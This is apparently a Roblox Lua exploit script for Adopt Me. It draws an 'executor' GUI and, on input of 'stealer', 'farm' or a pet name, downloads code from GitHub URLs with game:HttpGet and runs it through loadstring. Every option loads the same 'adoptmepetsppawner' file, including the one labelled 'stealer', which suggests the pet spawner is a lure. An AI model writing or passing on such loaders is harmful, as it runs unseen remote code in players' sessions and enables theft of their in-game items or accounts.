local ScreenGui = Instance.new("ScreenGui")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Title = Instance.new("TextLabel")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Title.Parent = ScreenGui
Title.Size = UDim2.new(0, 300, 0, 50)
Title.Position = UDim2.new(0.5, -150, 0.3, 0)
Title.Text = "Shadow Scripting Executor"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 20

TextBox.Parent = ScreenGui
TextBox.Size = UDim2.new(0, 200, 0, 50)
TextBox.Position = UDim2.new(0.5, -100, 0.4, 0)
TextBox.PlaceholderText = "Enter 'stealer', 'farm', or pet name"
TextBox.Text = ""

Button.Parent = ScreenGui
Button.Size = UDim2.new(0, 200, 0, 50)
Button.Position = UDim2.new(0.5, -100, 0.5, 0)
Button.Text = "Execute"

local function safeLoad(url)
    local success, err = pcall(function()
        wait(1)
        loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Failed to execute script: " .. tostring(err))
    end
end

local function stealer()
    safeLoad("https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/script.lua")
end 

local function farm()
    safeLoad("https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/adoptmepetsppawner")
end 

local pets = {
    "Shadow Dragon", "Frost Dragon", "Bat Dragon", "Arctic Reindeer", "Giraffe",
    "Owl", "Parrot", "Evil Unicorn", "Unicorn", "Turtle", "Kangaroo",
    "Monkey King", "Diamond Griffin", "Diamond Unicorn", "Diamond Dragon",
    "Golden Dragon", "Golden Griffin", "Golden Unicorn", "Albino Monkey",
    "Axolotl", "Chameleon", "Chimera", "Cobra", "Dodo", "Ghost Dragon",
    "Golden Penguin", "Husky", "Ice Golem", "Kitsune", "Lava Dragon",
    "Meerkat", "Phoenix", "Reindeer", "T-Rex", "Turkey", "Walrus",
    "Zombie Buffalo"
}

local validPetsLower = {}
for _, pet in ipairs(pets) do
    validPetsLower[pet:lower()] = true
    validPetsLower["neon " .. pet:lower()] = true
    validPetsLower["mega neon " .. pet:lower()] = true
end

local function executeScript()
    local input = TextBox.Text:lower()
    if input == "stealer" then
        farm()
    elseif input == "farm" then
        farm()
    elseif validPetsLower[input] then
        safeLoad("https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/adoptmepetsppawner")
    else
        warn("Invalid input! Type 'stealer', 'farm', or a valid pet name.")
    end
end

Button.MouseButton1Click:Connect(executeScript)
